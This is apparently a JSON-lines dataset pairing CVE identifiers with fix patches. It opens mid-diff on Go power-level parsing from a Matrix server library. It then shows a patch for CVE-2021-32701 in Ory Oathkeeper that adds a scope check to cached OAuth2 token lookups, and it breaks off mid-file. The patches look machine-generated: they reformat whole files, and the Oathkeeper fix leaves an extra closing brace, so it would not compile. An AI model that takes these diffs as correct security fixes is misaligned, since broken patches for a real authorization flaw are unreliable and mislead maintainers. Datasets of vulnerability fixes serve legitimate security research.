`json:\"events\"`\n-\t\t\tStateDefaultLevel  levelJSONValue            `json:\"state_default\"`\n-\t\t\tEventDefaultLevel  levelJSONValue            `json:\"event_default\"`\n-\t\t\tNotificationLevels map[string]levelJSONValue `json:\"notifications\"`\n-\t\t}\n-\t\tif err = json.Unmarshal(event.Content(), &content); err != nil {\n-\t\t\terr = errorf(\"unparsable power_levels event content: %s\", err.Error())\n-\t\t\treturn\n-\t\t}\n-\n-\t\t// Update the levels with the values that are present in the event content.\n-\t\tcontent.InviteLevel.assignIfExists(&c.Invite)\n-\t\tcontent.BanLevel.assignIfExists(&c.Ban)\n-\t\tcontent.KickLevel.assignIfExists(&c.Kick)\n-\t\tcontent.RedactLevel.assignIfExists(&c.Redact)\n-\t\tcontent.UsersDefaultLevel.assignIfExists(&c.UsersDefault)\n-\t\tcontent.StateDefaultLevel.assignIfExists(&c.StateDefault)\n-\t\tcontent.EventDefaultLevel.assignIfExists(&c.EventsDefault)\n-\n-\t\tfor k, v := range content.UserLevels {\n-\t\t\tif c.Users == nil {\n-\t\t\t\tc.Users = make(map[string]int64)\n-\t\t\t}\n-\t\t\tc.Users[k] = v.value\n-\t\t}\n-\n-\t\tfor k, v := range content.EventLevels {\n-\t\t\tif c.Events == nil {\n-\t\t\t\tc.Events = make(map[string]int64)\n-\t\t\t}\n-\t\t\tc.Events[k] = v.value\n-\t\t}\n-\n-\t\tfor k, v := range content.NotificationLevels {\n-\t\t\tif c.Notifications == nil {\n-\t\t\t\tc.Notifications = make(map[string]int64)\n-\t\t\t}\n-\t\t\tc.Notifications[k] = v.value\n-\t\t}\n-\t}\n-\n-\treturn\n+        // Set the levels to their default values.\n+        c.Defaults()\n+\n+        var strict bool\n+        if strict, err = event.roomVersion.RequireIntegerPowerLevels(); err != nil {\n+                return\n+        } else if strict {\n+                // Unmarshal directly to PowerLevelContent, since that will kick up an\n+                // error if one of the power levels isn't an int64.\n+                if err = json.Unmarshal(event.Content(), &c); err != nil {\n+                        err = errorf(\"unparsable power_levels event content: %s\", err.Error())\n+                        return\n+                }\n+        } else {\n+                // We can't extract the JSON directly to the powerLevelContent because we\n+                // need to convert string values to int values.\n+                var content struct {\n+                        InviteLevel        levelJSONValue            `json:\"invite\"`\n+                        BanLevel           levelJSONValue            `json:\"ban\"`\n+                        KickLevel          levelJSONValue            `json:\"kick\"`\n+                        RedactLevel        levelJSONValue            `json:\"redact\"`\n+                        UserLevels         map[string]levelJSONValue `json:\"users\"`\n+                        UsersDefaultLevel  levelJSONValue            `json:\"users_default\"`\n+                        EventLevels        map[string]levelJSONValue `json:\"events\"`\n+                        StateDefaultLevel  levelJSONValue            `json:\"state_default\"`\n+                        EventsDefaultLevel  levelJSONValue            `json:\"events_default\"`\n+                        NotificationLevels map[string]levelJSONValue `json:\"notifications\"`\n+                }\n+                if err = json.Unmarshal(event.Content(), &content); err != nil {\n+                        err = errorf(\"unparsable power_levels event content: %s\", err.Error())\n+                        return\n+                }\n+\n+                // Update the levels with the values that are present in the event content.\n+                content.InviteLevel.assignIfExists(&c.Invite)\n+                content.BanLevel.assignIfExists(&c.Ban)\n+                content.KickLevel.assignIfExists(&c.Kick)\n+                content.RedactLevel.assignIfExists(&c.Redact)\n+                content.UsersDefaultLevel.assignIfExists(&c.UsersDefault)\n+                content.StateDefaultLevel.assignIfExists(&c.StateDefault)\n+                content.EventsDefaultLevel.assignIfExists(&c.EventsDefault)\n+\n+                for k, v := range content.UserLevels {\n+                        if c.Users == nil {\n+                                c.Users = make(map[string]int64)\n+                        }\n+                        c.Users[k] = v.value\n+                }\n+\n+                for k, v := range content.EventLevels {\n+                        if c.Events == nil {\n+                                c.Events = make(map[string]int64)\n+                        }\n+                        c.Events[k] = v.value\n+                }\n+\n+                for k, v := range content.NotificationLevels {\n+                        if c.Notifications == nil {\n+                                c.Notifications = make(map[string]int64)\n+                        }\n+                        c.Notifications[k] = v.value\n+                }\n+        }\n+\n+        return\n }\n \n // A levelJSONValue is used for unmarshalling power levels from JSON.\n // It is intended to replicate the effects of x = int(content[\"key\"]) in python.\n type levelJSONValue struct {\n-\t// Was a value loaded from the JSON?\n-\texists bool\n-\t// The integer value of the power level.\n-\tvalue int64\n+        // Was a value loaded from the JSON?\n+        exists bool\n+        // The integer value of the power level.\n+        value int64\n }\n \n func (v *levelJSONValue) UnmarshalJSON(data []byte) error {\n-\tvar stringValue string\n-\tvar int64Value int64\n-\tvar floatValue float64\n-\tvar err error\n-\n-\t// First try to unmarshal as an int64.\n-\tif int64Value, err = strconv.ParseInt(string(data), 10, 64); err != nil {\n-\t\t// If unmarshalling as an int64 fails try as a string.\n-\t\tif err = json.Unmarshal(data, &stringValue); err != nil {\n-\t\t\t// If unmarshalling as a string fails try as a float.\n-\t\t\tif floatValue, err = strconv.ParseFloat(string(data), 64); err != nil {\n-\t\t\t\treturn err\n-\t\t\t}\n-\t\t\tint64Value = int64(floatValue)\n-\t\t} else {\n-\t\t\t// If we managed to get a string, try parsing the string as an int.\n-\t\t\tint64Value, err = strconv.ParseInt(strings.TrimSpace(stringValue), 10, 64)\n-\t\t\tif err != nil {\n-\t\t\t\treturn err\n-\t\t\t}\n-\t\t}\n-\t}\n-\tv.exists = true\n-\tv.value = int64Value\n-\treturn nil\n+        var stringValue string\n+        var int64Value int64\n+        var floatValue float64\n+        var err error\n+\n+        // First try to unmarshal as an int64.\n+        if int64Value, err = strconv.ParseInt(string(data), 10, 64); err != nil {\n+                // If unmarshalling as an int64 fails try as a string.\n+                if err = json.Unmarshal(data, &stringValue); err != nil {\n+                        // If unmarshalling as a string fails try as a float.\n+                        if floatValue, err = strconv.ParseFloat(string(data), 64); err != nil {\n+                                return err\n+                        }\n+                        int64Value = int64(floatValue)\n+                } else {\n+                        // If we managed to get a string, try parsing the string as an int.\n+                        int64Value, err = strconv.ParseInt(strings.TrimSpace(stringValue), 10, 64)\n+                        if err != nil {\n+                                return err\n+                        }\n+                }\n+        }\n+        v.exists = true\n+        v.value = int64Value\n+        return nil\n }\n \n // assign the power level if a value was present in the JSON.\n func (v *levelJSONValue) assignIfExists(to *int64) {\n-\tif v.exists {\n-\t\t*to = v.value\n-\t}\n+        if v.exists {\n+                *to = v.value\n+        }\n }\n \n // Check if the user ID is a valid user ID.\n func isValidUserID(userID string) bool {\n-\t// TODO: Do we want to add anymore checks beyond checking the sigil and that it has a domain part?\n-\treturn userID[0] == '@' && strings.IndexByte(userID, ':') != -1\n+        // TODO: Do we want to add anymore checks beyond checking the sigil and that it has a domain part?\n+        return userID[0] == '@' && strings.IndexByte(userID, ':') != -1\n }\n"}
{"cve":"CVE-2021-32701:0708", "fix_patch": "diff --git a/pipeline/authn/authenticator_oauth2_introspection.go b/pipeline/authn/authenticator_oauth2_introspection.go\nindex 285cbd9..a6455d2 100644\n--- a/pipeline/authn/authenticator_oauth2_introspection.go\n+++ b/pipeline/authn/authenticator_oauth2_introspection.go\n@@ -1,341 +1,350 @@\n package authn\n \n import (\n-\t\"context\"\n-\t\"crypto/md5\"\n-\t\"encoding/json\"\n-\t\"fmt\"\n-\t\"net/http\"\n-\t\"net/url\"\n-\t\"strings\"\n-\t\"sync\"\n-\t\"time\"\n-\n-\t\"github.com/dgraph-io/ristretto\"\n-\n-\t\"github.com/opentracing/opentracing-go\"\n-\t\"github.com/opentracing/opentracing-go/ext\"\n-\n-\t\"github.com/pkg/errors\"\n-\t\"golang.org/x/oauth2/clientcredentials\"\n-\n-\t\"github.com/ory/go-convenience/stringslice\"\n-\t\"github.com/ory/x/httpx\"\n-\t\"github.com/ory/x/logrusx\"\n-\n-\t\"github.com/ory/oathkeeper/driver/configuration\"\n-\t\"github.com/ory/oathkeeper/helper\"\n-\t\"github.com/ory/oathkeeper/pipeline\"\n+        \"context\"\n+        \"crypto/md5\"\n+        \"encoding/json\"\n+        \"fmt\"\n+        \"net/http\"\n+        \"net/url\"\n+        \"strings\"\n+        \"sync\"\n+        \"time\"\n+\n+        \"github.com/dgraph-io/ristretto\"\n+\n+        \"github.com/opentracing/opentracing-go\"\n+        \"github.com/opentracing/opentracing-go/ext\"\n+\n+        \"github.com/pkg/errors\"\n+        \"golang.org/x/oauth2/clientcredentials\"\n+\n+        \"github.com/ory/go-convenience/stringslice\"\n+        \"github.com/ory/x/httpx\"\n+        \"github.com/ory/x/logrusx\"\n+\n+        \"github.com/ory/oathkeeper/driver/configuration\"\n+        \"github.com/ory/oathkeeper/helper\"\n+        \"github.com/ory/oathkeeper/pipeline\"\n )\n \n type AuthenticatorOAuth2IntrospectionConfiguration struct {\n-\tScopes                      []string                                              `json:\"required_scope\"`\n-\tAudience                    []string                                              `json:\"target_audience\"`\n-\tIssuers                     []string                                              `json:\"trusted_issuers\"`\n-\tPreAuth                     *AuthenticatorOAuth2IntrospectionPreAuthConfiguration `json:\"pre_authorization\"`\n-\tScopeStrategy               string                                                `json:\"scope_strategy\"`\n-\tIntrospectionURL            string                                                `json:\"introspection_url\"`\n-\tBearerTokenLocation         *helper.BearerTokenLocation                           `json:\"token_from\"`\n-\tIntrospectionRequestHeaders map[string]string                                     `json:\"introspection_request_headers\"`\n-\tRetry                       *AuthenticatorOAuth2IntrospectionRetryConfiguration   `json:\"retry\"`\n-\tCache                       cacheConfig                                           `json:\"cache\"`\n+        Scopes                      []string                                              `json:\"required_scope\"`\n+        Audience                    []string                                              `json:\"target_audience\"`\n+        Issuers                     []string                                              `json:\"trusted_issuers\"`\n+        PreAuth                     *AuthenticatorOAuth2IntrospectionPreAuthConfiguration `json:\"pre_authorization\"`\n+        ScopeStrategy               string                                                `json:\"scope_strategy\"`\n+        IntrospectionURL            string                                                `json:\"introspection_url\"`\n+        BearerTokenLocation         *helper.BearerTokenLocation                           `json:\"token_from\"`\n+        IntrospectionRequestHeaders map[string]string                                     `json:\"introspection_request_headers\"`\n+        Retry                       *AuthenticatorOAuth2IntrospectionRetryConfiguration   `json:\"retry\"`\n+        Cache                       cacheConfig                                           `json:\"cache\"`\n }\n \n type AuthenticatorOAuth2IntrospectionPreAuthConfiguration struct {\n-\tEnabled      bool     `json:\"enabled\"`\n-\tClientID     string   `json:\"client_id\"`\n-\tClientSecret string   `json:\"client_secret\"`\n-\tAudience     string   `json:\"audience\"`\n-\tScope        []string `json:\"scope\"`\n-\tTokenURL     string   `json:\"token_url\"`\n+        Enabled      bool     `json:\"enabled\"`\n+        ClientID     string   `json:\"client_id\"`\n+        ClientSecret string   `json:\"client_secret\"`\n+        Audience     string   `json:\"audience\"`\n+        Scope        []string `json:\"scope\"`\n+        TokenURL     string   `json:\"token_url\"`\n }\n \n type AuthenticatorOAuth2IntrospectionRetryConfiguration struct {\n-\tTimeout string `json:\"max_delay\"`\n-\tMaxWait string `json:\"give_up_after\"`\n+        Timeout string `json:\"max_delay\"`\n+        MaxWait string `json:\"give_up_after\"`\n }\n \n type cacheConfig struct {\n-\tEnabled bool   `json:\"enabled\"`\n-\tTTL     string `json:\"ttl\"`\n-\tMaxCost int    `json:\"max_cost\"`\n+        Enabled bool   `json:\"enabled\"`\n+        TTL     string `json:\"ttl\"`\n+        MaxCost int    `json:\"max_cost\"`\n }\n \n type AuthenticatorOAuth2Introspection struct {\n-\tc configuration.Provider\n+        c configuration.Provider\n \n-\tclientMap map[string]*http.Client\n-\tmu        sync.RWMutex\n+        clientMap map[string]*http.Client\n+        mu        sync.RWMutex\n \n-\ttokenCache *ristretto.Cache\n-\tcacheTTL   *time.Duration\n-\tlogger     *logrusx.Logger\n+        tokenCache *ristretto.Cache\n+        cacheTTL   *time.Duration\n+        logger     *logrusx.Logger\n }\n \n func NewAuthenticatorOAuth2Introspection(c configuration.Provider, logger *logrusx.Logger) *AuthenticatorOAuth2Introspection {\n-\treturn &AuthenticatorOAuth2Introspection{c: c, logger: logger, clientMap: make(map[string]*http.Client)}\n+        return &AuthenticatorOAuth2Introspection{c: c, logger: logger, clientMap: make(map[string]*http.Client)}\n }\n \n func (a *AuthenticatorOAuth2Introspection) GetID() string {\n-\treturn \"oauth2_introspection\"\n+        return \"oauth2_introspection\"\n }\n \n type AuthenticatorOAuth2IntrospectionResult struct {\n-\tActive    bool                   `json:\"active\"`\n-\tExtra     map[string]interface{} `json:\"ext\"`\n-\tSubject   string                 `json:\"sub,omitempty\"`\n-\tUsername  string                 `json:\"username\"`\n-\tAudience  []string               `json:\"aud\"`\n-\tTokenType string                 `json:\"token_type\"`\n-\tIssuer    string                 `json:\"iss\"`\n-\tClientID  string                 `json:\"client_id,omitempty\"`\n-\tScope     string                 `json:\"scope,omitempty\"`\n-\tExpires   int64                  `json:\"exp\"`\n-\tTokenUse  string                 `json:\"token_use\"`\n+        Active    bool                   `json:\"active\"`\n+        Extra     map[string]interface{} `json:\"ext\"`\n+        Subject   string                 `json:\"sub,omitempty\"`\n+        Username  string                 `json:\"username\"`\n+        Audience  []string               `json:\"aud\"`\n+        TokenType string                 `json:\"token_type\"`\n+        Issuer    string                 `json:\"iss\"`\n+        ClientID  string                 `json:\"client_id,omitempty\"`\n+        Scope     string                 `json:\"scope,omitempty\"`\n+        Expires   int64                  `json:\"exp\"`\n+        TokenUse  string                 `json:\"token_use\"`\n }\n \n-func (a *AuthenticatorOAuth2Introspection) tokenFromCache(config *AuthenticatorOAuth2IntrospectionConfiguration, token string) (*AuthenticatorOAuth2IntrospectionResult, bool) {\n-\tif !config.Cache.Enabled {\n-\t\treturn nil, false\n-\t}\n-\n-\titem, found := a.tokenCache.Get(token)\n-\tif !found {\n-\t\treturn nil, false\n-\t}\n-\n-\ti := item.(*AuthenticatorOAuth2IntrospectionResult)\n-\texpires := time.Unix(i.Expires, 0)\n-\tif expires.Before(time.Now()) {\n-\t\ta.tokenCache.Del(token)\n-\t\treturn nil, false\n-\t}\n+func (a *AuthenticatorOAuth2Introspection) tokenFromCache(config *AuthenticatorOAuth2IntrospectionConfiguration, token string, ss func([]string, string) bool, requiredScopes []string) (*AuthenticatorOAuth2IntrospectionResult, bool) {\n+        if !config.Cache.Enabled {\n+                return nil, false\n+        }\n+\n+        item, found := a.tokenCache.Get(token)\n+        if !found {\n+                return nil, false\n+        }\n+\n+        i := item.(*AuthenticatorOAuth2IntrospectionResult)\n+        expires := time.Unix(i.Expires, 0)\n+        if expires.Before(time.Now()) {\n+                a.tokenCache.Del(token)\n+                return nil, false\n+        }\n+\n+        if ss != nil {\n+for _, scope := range requiredScopes {\n+if !ss(strings.Split(i.Scope, \" \"), scope) {\n+return nil, false\n+}\n+}\n+}\n \n-\treturn i, true\n+return i, true\n+}\n }\n \n func (a *AuthenticatorOAuth2Introspection) tokenToCache(config *AuthenticatorOAuth2IntrospectionConfiguration, i *AuthenticatorOAuth2IntrospectionResult, token string) {\n-\tif !config.Cache.Enabled {\n-\t\treturn\n-\t}\n-\n-\tif a.cacheTTL != nil {\n-\t\ta.tokenCache.SetWithTTL(token, i, 1, *a.cacheTTL)\n-\t} else {\n-\t\ta.tokenCache.Set(token, i, 1)\n-\t}\n+        if !config.Cache.Enabled {\n+                return\n+        }\n+\n+        if a.cacheTTL != nil {\n+                a.tokenCache.SetWithTTL(token, i, 1, *a.cacheTTL)\n+        } else {\n+                a.tokenCache.Set(token, i, 1)\n+        }\n }\n \n func (a *AuthenticatorOAuth2Introspection) traceRequest(ctx context.Context, req *http.Request) func() {\n-\ttracer := opentracing.GlobalTracer()\n-\tif tracer == nil {\n-\t\treturn func() {}\n-\t}\n-\n-\tparentSpan := opentracing.SpanFromContext(ctx)\n-\topts := make([]opentracing.StartSpanOption, 0, 1)\n-\tif parentSpan != nil {\n-\t\topts = append(opts, opentracing.ChildOf(parentSpan.Context()))\n-\t}\n-\n-\turlStr := req.URL.String()\n-\tclientSpan := tracer.StartSpan(req.Method+\" \"+urlStr, opts...)\n-\n-\text.SpanKindRPCClient.Set(clientSpan)\n-\text.HTTPUrl.Set(clientSpan, urlStr)\n-\text.HTTPMethod.Set(clientSpan, req.Method)\n-\n-\ttracer.Inject(clientSpan.Context(), opentracing.HTTPHeaders, opentracing.HTTPHeadersCarrier(req.Header))\n-\treturn clientSpan.Finish\n+        tracer := opentracing.GlobalTracer()\n+        if tracer == nil {\n+                return func() {}\n+        }\n+\n+        parentSpan := opentracing.SpanFromContext(ctx)\n+        opts := make([]opentracing.StartSpanOption, 0, 1)\n+        if parentSpan != nil {\n+                opts = append(opts, opentracing.ChildOf(parentSpan.Context()))\n+        }\n+\n+        urlStr := req.URL.String()\n+        clientSpan := tracer.StartSpan(req.Method+\" \"+urlStr, opts...)\n+\n+        ext.SpanKindRPCClient.Set(clientSpan)\n+        ext.HTTPUrl.Set(clientSpan, urlStr)\n+        ext.HTTPMethod.Set(clientSpan, req.Method)\n+\n+        tracer.Inject(clientSpan.Context(), opentracing.HTTPHeaders, opentracing.HTTPHeadersCarrier(req.Header))\n+        return clientSpan.Finish\n }\n \n func (a *AuthenticatorOAuth2Introspection) Authenticate(r *http.Request, session *AuthenticationSession, config json.RawMessage, _ pipeline.Rule) error {\n-\tcf, client, err := a.Config(config)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\n-\ttoken := helper.BearerTokenFromRequest(r, cf.BearerTokenLocation)\n-\tif token == \"\" {\n-\t\treturn errors.WithStack(ErrAuthenticatorNotResponsible)\n-\t}\n-\n-\tss := a.c.ToScopeStrategy(cf.ScopeStrategy, \"authenticators.oauth2_introspection.scope_strategy\")\n-\n-\ti, ok := a.tokenFromCache(cf, token)\n-\tif !ok {\n-\t\tbody := url.Values{\"token\": {token}}\n-\n-\t\tif ss == nil {\n-\t\t\tbody.Add(\"scope\", strings.Join(cf.Scopes, \" \"))\n-\t\t}\n-\n-\t\tintrospectReq, err := http.NewRequest(http.MethodPost, cf.IntrospectionURL, strings.NewReader(body.Encode()))\n-\t\tif err != nil {\n-\t\t\treturn errors.WithStack(err)\n-\t\t}\n-\t\tfor key, value := range cf.IntrospectionRequestHeaders {\n-\t\t\tintrospectReq.Header.Set(key, value)\n-\t\t}\n-\t\t// set/override the content-type header\n-\t\tintrospectReq.Header.Set(\"Content-Type\", \"application/x-www-form-urlencoded\")\n-\n-\t\t// add tracing\n-\t\tcloseSpan := a.traceRequest(r.Context(), introspectReq)\n-\n-\t\tresp, err := client.Do(introspectReq.WithContext(r.Context()))\n-\n-\t\t// close the span so it represents just the http request\n-\t\tcloseSpan()\n-\t\tif err != nil {\n-\t\t\treturn errors.WithStack(err)\n-\t\t}\n-\t\tdefer resp.Body.Close()\n-\n-\t\tif resp.StatusCode != http.StatusOK {\n-\t\t\treturn errors.Errorf(\"Introspection returned status code %d but expected %d\", resp.StatusCode, http.StatusOK)\n-\t\t}\n-\n-\t\tif err := json.NewDecoder(resp.Body).Decode(&i); err != nil {\n-\t\t\treturn errors.WithStack(err)\n-\t\t}\n-\n-\t\tif len(i.TokenUse) > 0 && i.TokenUse != \"access_token\" {\n-\t\t\treturn errors.WithStack(helper.ErrForbidden.WithReason(fmt.Sprintf(\"Use of introspected token is not an access token but \\\"%s\\\"\", i.TokenUse)))\n-\t\t}\n-\n-\t\tif !i.Active {\n-\t\t\treturn errors.WithStack(helper.ErrUnauthorized.WithReason(\"Access token i says token is not active\"))\n-\t\t}\n-\n-\t\tfor _, audience := range cf.Audience {\n-\t\t\tif !stringslice.Has(i.Audience, audience) {\n-\t\t\t\treturn errors.WithStack(helper.ErrForbidden.WithReason(fmt.Sprintf(\"Token audience is not intended for target audience %s\", audience)))\n-\t\t\t}\n-\t\t}\n-\n-\t\tif len(cf.Issuers) > 0 {\n-\t\t\tif !stringslice.Has(cf.Issuers, i.Issuer) {\n-\t\t\t\treturn errors.WithStack(helper.ErrForbidden.WithReason(fmt.Sprintf(\"Token issuer does not match any trusted issuer\")))\n-\t\t\t}\n-\t\t}\n-\n-\t\tif ss != nil {\n-\t\t\tfor _, scope := range cf.Scopes {\n-\t\t\t\tif !ss(strings.Split(i.Scope, \" \"), scope) {\n-\t\t\t\t\treturn errors.WithStack(helper.ErrForbidden.WithReason(fmt.Sprintf(\"Scope %s was not granted\", scope)))\n-\t\t\t\t}\n-\t\t\t}\n-\t\t}\n-\n-\t\tif len(i.Extra) == 0 {\n-\t\t\ti.Extra = map[string]interface{}{}\n-\t\t}\n-\n-\t\ti.Extra[\"username\"] = i.Username\n-\t\ti.Extra[\"client_id\"] = i.ClientID\n-\t\ti.Extra[\"scope\"] = i.Scope\n-\n-\t\tif len(i.Audience) != 0 {\n-\t\t\ti.Extra[\"aud\"] = i.Audience\n-\t\t}\n-\n-\t\ta.tokenToCache(cf, i, token)\n-\t}\n-\n-\tsession.Subject = i.Subject\n-\tsession.Extra = i.Extra\n-\n-\treturn nil\n+        cf, client, err := a.Config(config)\n+        if err != nil {\n+                return err\n+        }\n+\n+        token := helper.BearerTokenFromRequest(r, cf.BearerTokenLocation)\n+        if token == \"\" {\n+                return errors.WithStack(ErrAuthenticatorNotResponsible)\n+        }\n+\n+        ss := a.c.ToScopeStrategy(cf.ScopeStrategy, \"authenticators.oauth2_introspection.scope_strategy\")\n+\n+        i, ok := a.tokenFromCache(cf, token, ss, cf.Scopes)\n+        if !ok {\n+                body := url.Values{\"token\": {token}}\n+\n+                if ss == nil {\n+                        body.Add(\"scope\", strings.Join(cf.Scopes, \" \"))\n+                }\n+\n+                introspectReq, err := http.NewRequest(http.MethodPost, cf.IntrospectionURL, strings.NewReader(body.Encode()))\n+                if err != nil {\n+                        return errors.WithStack(err)\n+                }\n+                for key, value := range cf.IntrospectionRequestHeaders {\n+                        introspectReq.Header.Set(key, value)\n+                }\n+                // set/override the content-type header\n+                introspectReq.Header.Set(\"Content-Type\", \"application/x-www-form-urlencoded\")\n+\n+                // add tracing\n+                closeSpan := a.traceRequest(r.Context(), introspectReq)\n+\n+                resp, err := client.Do(introspectReq.WithContext(r.Context()))\n+\n+                // close the span so it represents just the http request\n+                closeSpan()\n+                if err != nil {\n+                        return errors.WithStack(err)\n+                }\n+                defer resp.Body.Close()\n+\n+                if resp.StatusCode != http.StatusOK {\n+                        return errors.Errorf(\"Introspection returned status code %d but expected %d\", resp.StatusCode, http.StatusOK)\n+                }\n+\n+                if err := json.NewDecoder(resp.Body).Decode(&i); err != nil {\n+                        return errors.WithStack(err)\n+                }\n+\n+                if len(i.TokenUse) > 0 && i.TokenUse != \"access_token\" {\n+                        return errors.WithStack(helper.ErrForbidden.WithReason(fmt.Sprintf(\"Use of introspected token is not an access token but \\\"%s\\\"\", i.TokenUse)))\n+                }\n+\n+                if !i.Active {\n+                        return errors.WithStack(helper.ErrUnauthorized.WithReason(\"Access token i says token is not active\"))\n+                }\n+\n+                for _, audience := range cf.Audience {\n+                        if !stringslice.Has(i.Audience, audience) {\n+                                return errors.WithStack(helper.ErrForbidden.WithReason(fmt.Sprintf(\"Token audience is not intended for target audience %s\", audience)))\n+                        }\n+                }\n+\n+                if len(cf.Issuers) > 0 {\n+                        if !stringslice.Has(cf.Issuers, i.Issuer) {\n+                                return errors.WithStack(helper.ErrForbidden.WithReason(fmt.Sprintf(\"Token issuer does not match any trusted issuer\")))\n+                        }\n+                }\n+\n+                if ss != nil {\n+                        for _, scope := range cf.Scopes {\n+                                if !ss(strings.Split(i.Scope, \" \"), scope) {\n+                                        return errors.WithStack(helper.ErrForbidden.WithReason(fmt.Sprintf(\"Scope %s was not granted\", scope)))\n+                                }\n+                        }\n+                }\n+\n+                if len(i.Extra) == 0 {\n+                        i.Extra = map[string]interface{}{}\n+                }\n+\n+                i.Extra[\"username\"] = i.Username\n+                i.Extra[\"client_id\"] = i.ClientID\n+                i.Extra[\"scope\"] = i.Scope\n+\n+                if len(i.Audience) != 0 {\n+                        i.Extra[\"aud\"] = i.Audience\n+                }\n+\n+                a.tokenToCache(cf, i, token)\n+        }\n+\n+        session.Subject = i.Subject\n+        session.Extra = i.Extra\n+\n+        return nil\n }\n \n func (a *AuthenticatorOAuth2Introspection) Validate(config json.RawMessage) error {\n-\tif !a.c.AuthenticatorIsEnabled(a.GetID()) {\n-\t\treturn NewErrAuthenticatorNotEnabled(a)\n-\t}\n+        if !a.c.AuthenticatorIsEnabled(a.GetID()) {\n+                return NewErrAuthenticatorNotEnabled(a)\n+        }\n \n-\t_, _, err := a.Config(config)\n-\treturn err\n+        _, _, err := a.Config(config)\n+        return err\n }\n \n func (a *AuthenticatorOAuth2Introspection) Config(config json.RawMessage) (*AuthenticatorOAuth2IntrospectionConfiguration, *http.Client, error) {\n-\tvar c AuthenticatorOAuth2IntrospectionConfiguration\n-\tif err := a.c.AuthenticatorConfig(a.GetID(), config, &c); err != nil {\n-\t\treturn nil, nil, NewErrAuthenticatorMisconfigured(a, err)\n-\t}\n-\n-\tclientKey := fmt.Sprintf(\"%x\", md5.Sum([]byte(config)))\n-\ta.mu.RLock()\n-\tclient, ok := a.clientMap[clientKey]\n-\ta.mu.RUnlock()\n-\n-\tif !ok {\n-\t\ta.logger.Debug(\"Initializing http client\")\n-\t\tvar rt http.RoundTripper\n-\t\tif c.PreAuth != nil && c.PreAuth.Enabled {\n-\t\t\tvar ep url.Values\n-\n-\t\t\tif c.PreAuth.Audience != \"\" {\n-\t\t\t\tep = url.Values{\"audience\": {c.PreAuth.Audience}}\n-\t\t\t}\n-\n-\t\t\trt = (&clientcredentials.Config{\n-\t\t\t\tClientID:       c.PreAuth.ClientID,\n-\t\t\t\tClientSecret:   c.PreAuth.ClientSecret,\n-\t\t\t\tScopes:         c.PreAuth.Scope,\n-\t\t\t\tEndpointParams: ep,\n-\t\t\t\tTokenURL:       c.PreAuth.TokenURL,\n-\t\t\t}).Client(context.Background()).Transport\n-\t\t}\n-\n-\t\tif c.Retry == nil {\n-\t\t\tc.Retry = &AuthenticatorOAuth2IntrospectionRetryConfiguration{Timeout: \"500ms\", MaxWait: \"1s\"}\n-\t\t} else {\n-\t\t\tif c.Retry.Timeout == \"\" {\n-\t\t\t\tc.Retry.Timeout = \"500ms\"\n-\t\t\t}\n-\t\t\tif c.Retry.MaxWait == \"\" {\n-\t\t\t\tc.Retry.MaxWait = \"1s\"\n-\t\t\t}\n-\t\t}\n-\t\tduration, err := time.ParseDuration(c.Retry.Timeout)\n-\t\tif err != nil {\n-\t\t\treturn nil, nil, err\n-\t\t}\n-\t\ttimeout := time.Millisecond * duration\n-\n-\t\tmaxWait, err := time.ParseDuration(c.Retry.MaxWait)\n-\t\tif err != nil {\n-\t\t\treturn nil, nil, err\n-\t\t}\n-\n-\t\tclient = httpx.NewResilientClientLatencyToleranceConfigurable(rt, timeout, maxWait)\n-\t\ta.mu.Lock()\n-\t\ta.clientMap[clientKey] = client\n-\t\ta.mu.Unlock()\n-\t}\n-\n-\tif c.Cache.TTL != \"\" {\n-\t\tcacheTTL, err := time.ParseDuration(c.Cache.TTL)\n-\t\tif err != nil {\n-\t\t\treturn nil, nil, err\n-\t\t}\n-\t\ta.cacheTTL = &cacheTTL\n-\t}\n-\n-\tif a.tokenCache == nil {\n-\t\ta.logger.Debugf(\"Creating cache with max cost: %d\", c.Cache.MaxCost)\n-\t\tcache, _ := ristretto.NewCache(&ristretto.Config{\n-\t\t\t// This will hold about 1000 unique mutation responses.\n-\t\t\tNumCounters: 10000,\n-\t\t\t// Allocate a max\n-\t\t\tMaxCost: int64(c.Cache.MaxCost),\n-\t\t\t// This is a best-practice value.\n-\t\t\tBufferItems: 64,\n-\t\t})\n-\n-\t\ta.tokenCache = cache\n-\t}\n-\n-\treturn &c, client, nil\n+        var c AuthenticatorOAuth2IntrospectionConfiguration\n+        if err := a.c.AuthenticatorConfig(a.GetID(), config, &c); err != nil {\n+                return nil, nil, NewErrAuthenticatorMisconfigured(a, err)\n+        }\n+\n+        clientKey := fmt.Sprintf(\"%x\", md5.Sum([]byte(config)))\n+        a.mu.RLock()\n+        client, ok := a.clientMap[clientKey]\n+        a.mu.RUnlock()\n+\n+        if !ok {\n+                a.logger.Debug(\"Initializing http client\")\n+                var rt http.RoundTripper\n+                if c.PreAuth != nil && c.PreAuth.Enabled {\n+                        var ep url.Values\n+\n+                        if c.PreAuth.Audience != \"\" {\n+                                ep = url.Values{\"audience\": {c.PreAuth.Audience}}\n+                        }\n+\n+                        rt = (&clientcredentials.Config{\n+                                ClientID:       c.PreAuth.ClientID,\n+                                ClientSecret:   c.PreAuth.ClientSecret,\n+                                Scopes:         c.PreAuth.Scope,\n+                                EndpointParams: ep,\n+                                TokenURL:       c.PreAuth.TokenURL,\n+                        }).Client(context.Background()).Transport\n+                }\n+\n+                if c.Retry == nil {\n+                        c.Retry = &AuthenticatorOAuth2IntrospectionRetryConfiguration{Timeout: \"500ms\", MaxWait: \"1s\"}\n+                } else {\n+                        if c.Retry.Timeout == \"\" {\n+                                c.Retry.Timeout = \"500ms\"\n+                        }\n+                        if c.Retry.MaxWait == \"\" {\n+                                c.Retry.MaxWait = \"1s\"\n+                        }\n+                }\n+                duration, err := time.ParseDuration(c.Retry.Timeout)\n+                if err != nil {\n+                        return nil, nil, err\n+                }\n+                timeout := time.Millisecond * duration\n+\n+                maxWait, err := time.ParseDuration(c.Retry.MaxWait)\n+                if err != nil {\n+                        return nil, nil, err\n+                }\n+\n+                client = httpx.NewResilientClientLatencyToleranceConfigurable(rt, timeout, maxWait)\n+                a.mu.Lock()\n+                a.clientMap[clientKey] = client\n+                a.mu.Unlock()\n+        }\n+\n+        if c.Cache.TTL != \"\" {\n+                cacheTTL, err := time.ParseDuration(c.Cache.TTL)\n+                if err != nil {\n+                        return nil, nil, err\n+                }\n+                a.cacheTTL = &cacheTTL\n+        }\n+\n+        if a.tokenCache == nil {\n+                a.logger.Debugf(\"Creating cache with max cost: %d\", c.Cache.MaxCost)\n+                cache, _ := ristretto.NewCache(&ristretto.Config{\n+                        // This will hold about 1000 unique 